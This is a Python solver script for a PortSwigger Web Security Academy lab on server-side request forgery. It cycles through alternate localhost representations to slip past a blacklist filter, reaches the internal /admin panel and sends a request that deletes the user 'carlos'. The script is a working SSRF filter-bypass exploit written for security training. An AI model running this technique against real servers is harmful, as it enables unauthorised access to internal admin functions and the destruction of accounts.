"""
Lab 4: SSRF with blacklist-based input filter
https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter
Difficulty: Practitioner

📝 Direct localhost/127.0.0.1 gets blocked by string-matching. Cycle through
alternate representations that still resolve to loopback until one slips
past the blacklist.
"""

from utils import get_session, log, note, stock_check, localhost_variants

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"


def run():
    s = get_session()

    for host in localhost_variants():
        url = f"http://{host}/admin"
        r = stock_check(s, TARGET, "1", url)
        blocked = "blocked" in r.text.lower() or r.status_code in (400, 403)
        log(f"{host!r:30} -> status {r.status_code}, blocked={blocked}", ok=not blocked)
        if not blocked and ("admin" in r.text.lower() or r.status_code == 200):
            log(f"Bypass found with: {host}")
            r = stock_check(s, TARGET, "1", f"http://{host}/admin/delete?username=carlos")
            log(f"Delete status: {r.status_code}")
            return

    log("None of the standard variants bypassed the filter — try adding more.", ok=False)


if __name__ == "__main__":
    run()
